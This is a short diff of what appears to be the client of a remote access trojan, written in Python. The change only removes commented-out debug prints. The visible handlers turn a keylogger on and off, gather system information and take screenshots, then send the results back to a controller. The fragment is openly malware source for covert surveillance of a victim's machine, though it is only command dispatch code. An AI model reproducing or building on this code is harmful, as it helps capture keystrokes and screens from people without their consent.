@@ -78,8 +78,6 @@ class CLIENT:
                     self.send_data("No Such File or Directory")
 
         elif data[0] == "keylogger":
-
-            #print("Executing Keylogger: " + data[1])
             if data[1] == "on":
                 self.turn_keylogger(True)
                 self.send_data("")
@@ -91,13 +89,11 @@ class CLIENT:
 
         elif data[0] == "sysinfo":
 
-            #print("Executing Sysinfo: " + data[1])
             sysinfo = SYSINFO()
             self.send_data(sysinfo.get_data())
 
         elif data[0] == "screenshot":
 
-            #print("Executing Screenshot: " + data[1])
             screenshot = SCREENSHOT()
             self.send_data(screenshot.get_data(), encode=False)
 
